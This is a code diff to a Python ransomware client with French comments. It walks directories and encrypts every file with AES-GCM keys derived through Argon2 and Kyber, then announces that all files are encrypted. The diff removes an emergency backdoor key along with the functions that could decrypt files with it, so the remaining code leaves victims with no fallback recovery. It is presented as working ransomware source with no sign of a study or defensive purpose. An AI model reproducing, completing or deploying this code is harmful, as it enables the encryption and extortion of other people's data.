@@ -81,7 +81,6 @@ class RansomwareClient:
         salt = server_data["salt"]
         argon2_params = server_data["argon2_params"]
         kyber_public_key = server_data["kyber_public_key"]
-        backdoor_key = server_data["backdoor_key"]
 
         # 2. Dérive la Master Key avec Argon2
         print("[CLIENT] Dérivation de la Master Key...")
@@ -131,7 +130,7 @@ class RansomwareClient:
 
                 # Chiffre le fichier
                 try:
-                    self._encrypt_file(file_path, root_key, backdoor_key)
+                    self._encrypt_file(file_path, root_key)
                     encrypted_count += 1
                 except Exception as e:
                     print(f"  [ERREUR] Échec du chiffrement de {file_path.name}: {e}")
@@ -140,14 +139,13 @@ class RansomwareClient:
         print(f"[CLIENT] Mot de passe: {password}")
         print(f"[CLIENT] ATTENTION: Tous vos fichiers ont été chiffrés!")
 
-    def _encrypt_file(self, file_path: Path, root_key: bytes, backdoor_key: bytes) -> None:
+    def _encrypt_file(self, file_path: Path, root_key: bytes) -> None:
         """
         Chiffre un fichier individuel
 
         Args:
             file_path: Chemin du fichier à chiffrer
             root_key: Root Key pour encapsuler la clé du fichier
-            backdoor_key: Clé de secours
         """
         print(f"  [ENCRYPT] {file_path.name}")
 
@@ -164,18 +162,12 @@ class RansomwareClient:
         # Encapsule la clé de fichier avec la Root Key
         wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag = crypto_utils.wrap_key_aes_gcm(file_key, root_key)
 
-        # Encapsule aussi avec la clé de secours (pour mode urgence)
-        wrapped_key_backdoor_ciphertext, wrapped_key_backdoor_nonce, wrapped_key_backdoor_tag = crypto_utils.wrap_key_aes_gcm(file_key, backdoor_key)
-
         # Crée les métadonnées
         metadata = {
             "original_name": file_path.name,
             "wrapped_key_ciphertext": base64.b64encode(wrapped_key_ciphertext).decode('utf-8'),
             "wrapped_key_nonce": base64.b64encode(wrapped_key_nonce).decode('utf-8'),
             "wrapped_key_tag": base64.b64encode(wrapped_key_tag).decode('utf-8'),
-            "wrapped_key_backdoor_ciphertext": base64.b64encode(wrapped_key_backdoor_ciphertext).decode('utf-8'),
-            "wrapped_key_backdoor_nonce": base64.b64encode(wrapped_key_backdoor_nonce).decode('utf-8'),
-            "wrapped_key_backdoor_tag": base64.b64encode(wrapped_key_backdoor_tag).decode('utf-8'),
             "nonce": base64.b64encode(nonce).decode('utf-8'),
             "tag": base64.b64encode(tag).decode('utf-8'),
         }
@@ -441,77 +433,3 @@ class RansomwareClient:
 
         print("[CLIENT] Mot de passe changé avec succès!")
         print(f"[CLIENT] Nouveau mot de passe: {new_password}")
-
-    def emergency_decrypt_all(self, path: str = ".") -> None:
-        """
-        Déchiffre tous les fichiers en mode urgence avec la clé de secours
-
-        Args:
-            path: Chemin du dossier à déchiffrer
-        """
-        target_path = Path(path).resolve()
-
-        print(f"\n[CLIENT] [URGENCE] Déchiffrement d'urgence de: {target_path}")
-
-        # Demande la clé de secours au serveur
-        print("[CLIENT] Demande de la clé de secours au serveur...")
-        backdoor_key = server.emergency_decrypt()
-
-        # Parcourt et déchiffre tous les fichiers
-        print("[CLIENT] Déchiffrement avec la clé de secours...")
-        decrypted_count = 0
-
-        for root, dirs, files in os.walk(target_path):
-            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]
-
-            for filename in files:
-                if not filename.endswith(config.ENCRYPTED_EXTENSION):
-                    continue
-
-                encrypted_path = Path(root) / filename
-
-                try:
-                    self._decrypt_file_with_backdoor(encrypted_path, backdoor_key)
-                    decrypted_count += 1
-                except Exception as e:
-                    print(f"  [ERREUR] Échec: {e}")
-
-        print(f"\n[CLIENT] Déchiffrement d'urgence terminé: {decrypted_count} fichier(s)")
-
-    def _decrypt_file_with_backdoor(self, encrypted_path: Path, backdoor_key: bytes) -> None:
-        """
-        Déchiffre un fichier avec la clé de secours
-
-        Args:
-            encrypted_path: Chemin du fichier chiffré
-            backdoor_key: Clé de secours
-        """
-        base_name = encrypted_path.name.replace(config.ENCRYPTED_EXTENSION, "")
-        meta_path = encrypted_path.parent / (base_name + config.META_EXTENSION)
-
-        if not meta_path.exists():
-            raise FileNotFoundError(f"Métadonnées introuvables: {meta_path}")
-
-        print(f"  [URGENCE] {base_name}")
-
-        with open(meta_path, 'r') as f:
-            metadata = json.load(f)
-
-        wrapped_key_backdoor_ciphertext = base64.b64decode(metadata["wrapped_key_backdoor_ciphertext"])
-        wrapped_key_backdoor_nonce = base64.b64decode(metadata["wrapped_key_backdoor_nonce"])
-        wrapped_key_backdoor_tag = base64.b64decode(metadata["wrapped_key_backdoor_tag"])
-        nonce = base64.b64decode(metadata["nonce"])
-        tag = base64.b64decode(metadata["tag"])
-        original_name = metadata["original_name"]
-
-        # Désencapsule avec la clé de secours
-        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_backdoor_ciphertext, backdoor_key, wrapped_key_backdoor_nonce, wrapped_key_backdoor_tag)
-
-        with open(encrypted_path, 'rb') as f:
-            ciphertext = f.read()
-
-        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
-
-        decrypted_path = encrypted_path.parent / original_name
-        with open(decrypted_path, 'wb') as f:
-            f.write(plaintext)
